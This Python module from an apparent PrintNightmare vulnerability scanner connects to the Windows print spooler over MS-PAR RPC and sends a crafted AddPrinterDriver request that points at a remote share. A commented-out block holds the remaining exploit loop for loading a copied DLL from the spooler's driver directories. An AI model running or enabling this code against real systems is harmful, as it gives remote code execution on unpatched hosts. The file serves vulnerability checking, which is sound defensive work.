import logging
from impacket.dcerpc.v5 import par, rpcrt, epm
from impacket.dcerpc.v5.transport import DCERPCTransportFactory
from impacket.dcerpc.v5.dtypes import NULL
from itwasalladream.structs import DRIVER_INFO_2_BLOB

log = logging.getLogger("itwasalladream.par_vector")

PROTOCOL = "MS-PAR"

def connect(username, password, domain, lmhash, nthash, address, port, timeout):
    stringbinding = epm.hept_map(address, par.MSRPC_UUID_PAR, protocol='ncacn_ip_tcp')
    rpctransport = DCERPCTransportFactory(stringbinding)

    rpctransport.set_connect_timeout(timeout)

    log.debug(f"Connecting to {stringbinding}")
    rpctransport.set_credentials(username, password, domain, lmhash, nthash)
    dce = rpctransport.get_dce_rpc()
    dce.set_auth_level(rpcrt.RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
    dce.connect()

    dce.bind(par.MSRPC_UUID_PAR, transfer_syntax = ('8A885D04-1CEB-11C9-9FE8-08002B104860', '2.0'))
    log.debug("Bind OK")
    return dce

def getDrivers(dce, handle=NULL):
    #get drivers
    resp = par.hRpcAsyncEnumPrinterDrivers(dce, pName=handle, pEnvironment="Windows x64\x00", Level=2)
    data = b''.join(resp['pDrivers'])

    #parse drivers
    blob = DRIVER_INFO_2_BLOB()
    blob.fromString(data)
    #blob.dump()
    
    return blob


def exploit(dce, pDriverPath, share, handle=NULL):
    #build DRIVER_CONTAINER package
    container_info = par.DRIVER_CONTAINER()
    container_info['Level'] = 2
    container_info['DriverInfo']['tag'] = 2
    container_info['DriverInfo']['Level2']['cVersion']     = 3
    container_info['DriverInfo']['Level2']['pName']        = "1234\x00"
    container_info['DriverInfo']['Level2']['pEnvironment'] = "Windows x64\x00"
    container_info['DriverInfo']['Level2']['pDriverPath']  = pDriverPath + '\x00'
    container_info['DriverInfo']['Level2']['pDataFile']    = "{0}\x00".format(share)
    container_info['DriverInfo']['Level2']['pConfigFile']  = "C:\\Windows\\System32\\winhttp.dll\x00"
    
    flags = par.APD_COPY_ALL_FILES | 0x10 | 0x8000
    filename = share.split("\\")[-1]

    log.debug("Calling par.hRpcAsyncAddPrinterDriver()")
    resp = par.hRpcAsyncAddPrinterDriver(dce, pName=handle, pDriverContainer=container_info, dwFileCopyFlags=flags)

    # Below is not needed since we're not trying to actually exploit anything. First response from par.hRpcAsyncAddPrinterDriver() is (usually) enough to determine if host is vulnerable.
    """
    log.debug(f"Stage0: {resp['ErrorCode']}")

    container_info['DriverInfo']['Level2']['pConfigFile']  = "C:\\Windows\\System32\\kernelbase.dll\x00"
    for i in range(1, 30):
        try:
            container_info['DriverInfo']['Level2']['pConfigFile'] = f"C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\{i}\\{filename}\x00"
            resp = par.hRpcAsyncAddPrinterDriver(dce, pName=handle, pDriverContainer=container_info, dwFileCopyFlags=flags)
            log.debug(f"Stage{i}: {resp['ErrorCode']}")
            if (resp['ErrorCode'] == 0):
                log.debug("Exploit Completed")
                return
        except Exception as e:
            #print(e)
            pass
    """
